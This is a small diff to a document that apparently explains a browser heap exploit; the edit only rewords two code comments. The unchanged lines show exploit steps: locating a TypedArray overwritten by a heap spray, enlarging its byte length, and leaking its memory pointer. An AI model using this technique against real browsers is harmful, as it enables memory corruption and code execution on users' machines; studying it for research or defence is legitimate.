@@ -315,13 +315,13 @@ Size: 0x400                 Size: 0x400                  Size: 0x400            
                     // get a reference to TypedArray that they overwrite
                     myarray = arr1[itmp];
 
-                    // get the index to the pointer of the TypedArray
+                    // get the index where the pointer of the TypedArray is
                     mypos = biga.getUint32(i2 + 4, true) - spraypos + 0x50;
 
                     // set its byte length to a stupid number also
                     mydv.setUint32(mypos - 0x10, 0x100000, true);
 
-                    // leak the base of the myarray Array
+                    // leak the pointer of the TypedArray
                     myarraybase = mydv.getUint32(mypos, true);
 ```
 
